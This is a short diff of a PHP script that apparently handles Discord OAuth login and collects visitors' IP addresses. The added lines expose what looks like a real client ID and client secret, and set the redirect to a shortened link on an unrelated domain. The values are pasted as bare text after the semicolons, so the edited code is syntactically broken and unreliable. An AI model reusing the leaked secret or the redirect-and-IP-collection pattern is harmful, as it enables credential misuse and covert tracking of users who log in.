@@ -2,9 +2,9 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$client_id     = ""; 772188579177824266
+$client_secret = ""; gHWaJfagnT7otOKwZZoGMlKvruBq0xz9
+$redirect      = ""; http://blasze.tk/TFOY6A
 
 function get_ip_address()
 {
